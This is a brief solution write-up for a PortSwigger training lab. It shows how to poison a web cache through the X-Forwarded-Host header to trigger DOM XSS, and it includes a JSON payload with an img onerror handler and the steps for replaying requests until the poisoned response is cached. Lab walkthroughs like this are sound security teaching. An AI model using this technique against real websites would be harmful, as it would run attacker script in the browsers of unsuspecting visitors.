# Lab 11 — Web cache poisoning to exploit a DOM vulnerability (strict cacheability)

> **Expert** · [Official lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria)

**Entry point:** `X-Forwarded-Host` overrides `data.host` inside
`initGeoLocate()` → DOM XSS via the geolocate JSON. Responses with
`Set-Cookie` aren't cacheable.

## Solution

1. Host a malicious `/resources/json/geolocate.json` (with
   `Access-Control-Allow-Origin: *`):

```json
{"country": "<img src=1 onerror=alert(document.cookie) />"}
```

2. In Repeater, add a buster + `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
   If the response carries `Set-Cookie` it won't cache — reload the home
   page first so your browser already has the session cookie, then repeat
   with that cookie-less fresh request until `X-Cache: hit`.
3. Verify in the browser (alert fires), then keep replaying (no buster)
   until the victim visits — lab solved.

## Notes

"Strict cacheability" obstacles are usually solved by first acquiring the
cookies the app would set, then requesting as an established user.
